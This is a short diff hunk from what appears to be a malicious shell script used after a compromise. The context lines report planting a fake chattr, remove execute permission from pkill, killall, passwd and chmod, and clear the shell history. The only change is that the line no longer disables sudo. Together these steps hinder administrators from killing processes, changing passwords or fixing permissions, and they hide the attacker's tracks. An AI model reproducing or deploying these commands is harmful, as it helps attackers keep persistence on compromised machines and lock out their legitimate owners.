@@ -59,7 +59,7 @@ echo "------------------Fake chattr successfully added-----------------"
 echo "-----------------------------------------------------------------"
 chmod -x /usr/bin/pkill
 chmod -x /usr/bin/killall
-chmod -x /usr/bin/passwd && chmod -x /usr/bin/sudo && chmod -x /usr/bin/chmod
+chmod -x /usr/bin/passwd && chmod -x /usr/bin/chmod
 history -c
 echo "-----------------------------------------------------------------------------"
 echo "-----------------------------------------------------------------------------"
